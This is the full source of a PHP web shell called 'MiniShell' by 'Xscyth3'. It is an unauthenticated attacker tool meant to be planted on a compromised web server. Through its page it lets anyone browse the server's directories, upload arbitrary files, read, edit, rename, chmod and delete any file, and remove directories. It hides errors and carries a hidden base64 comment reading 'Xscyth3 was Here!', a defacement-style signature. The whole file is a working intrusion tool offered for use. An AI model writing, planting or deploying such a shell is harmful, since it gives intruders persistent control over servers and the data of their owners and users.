<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
echo '<!DOCTYPE HTML>
<HTML>
<link href="https://fonts.googleapis.com/css?family=Abel|Bubbler+One|Electrolize|Happy+Monkey|Jura|Quicksand|Sarpanch" rel="stylesheet">
<HEAD>
<script type="text/javascript"> function titlebar(e){var t="( MiniSheLL | Xscyth3 v1.0 )",i=100,r=e;t="   "+t+" ";var l=t.length;if("fwd"==rev)l>r?(r+=1,scroll=t.substr(0,r),document.title=scroll,timer=window.setTimeout("titlebar("+r+")",i)):(rev="bwd",timer=window.setTimeout("titlebar("+r+")",i));else if(r>0){r-=1;var o=l-r;scrol=t.substr(o,l),document.title=scrol,timer=window.setTimeout("titlebar("+r+")",i)}else rev="fwd",timer=window.setTimeout("titlebar("+r+")",i)}var rev="fwd";titlebar(0);</script>
<style>
body{
    font-family: "Quicksand";
background-color:   #424949 ;
 text-shadow:text-shadow:green 0px 0px 12px; color:white;
}

#content tr:hover{
    background-color:black;
    color:red;
}
#content .first{
    background-color: #c60404;
}
#content .first:hover
{
    color:#00cc00;
}
table{
    border: .5px gray dashed;
}
H1{
    font-family: Quicksand;
}
a{
    color: #99FF00;
    text-decoration: none;
}
a:hover{
    color:#1aff1a;
}


input,select,textarea{
    border: 1px white solid;
    -moz-border-radius: 1px;
    -webkit-border-radius:5px;
    border-radius:2px;
}
</style>

</HEAD>
<BODY>

<br /><br /><br /><br /><br />
<table width="900" border="0" cellpadding="2" cellspacing="2" align="center">
<tr><td align="center"><span style="background-color: #001a00"><[ MiniShell By Xscyth3 ]></span></td></tr>
<tr><td>Current Path : ';
if(isset($_GET['path'])){
    $path = base64_decode($_GET['path']);
}else{
    $path = getcwd();
}
$pathen = base64_encode($path);
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path='.base64_encode("/").'">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    $linkpath = '';
    for($i=0;$i<=$id;$i++){
        $linkpath .= "$paths[$i]";
        if($i != $id) $linkpath .= "/";
    }
    echo base64_encode($linkpath);
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">Done!</font><br />';
    }else{
        echo '<font color="red">Error!</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File&nbsp;&nbsp;&nbsp;: <input type="file" name="file" />
<input type="submit" value=">>" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td> Current File&nbsp;&nbsp;: ";
    echo base64_decode($_GET['filesrc']);
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value=">>" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Done.</font><br />';
            }else{
                echo '<font color="red">Change Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value=">>" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Edit Done.</font><br />';
            }else{
                echo '<font color="red">Edit Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value=">>" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Delete Dir Done.</font><br />';
            }else{
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content">
	<table width="880" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Dir/Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        $dirlink = base64_encode("$path/$dir");
        echo "<tr>
        <td><a href=\"?path=$dirlink\">$dir</a></td>
        <td><center>Directory</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }
        $filelink = base64_encode("$path/$file");
        echo "<tr>
        <td><a href=\"?filesrc=$filelink&path=$pathen\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>
		"
		;
    }
    echo '</table>
    </div>';
}
echo '<center> <!-- WHNjeXRoMyB3YXMgSGVyZSE= ---></center><br/><center>-=[ MiniShell v1.0 : <a href="https://www.facebook.com/XW3s13y.gov" target="_new">Xscyth3</a> ]=-<br/>[ All Rights Reserved 2016 ]</center>
</BODY>
</HTML>';
function perms($file){
    $perms = @fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>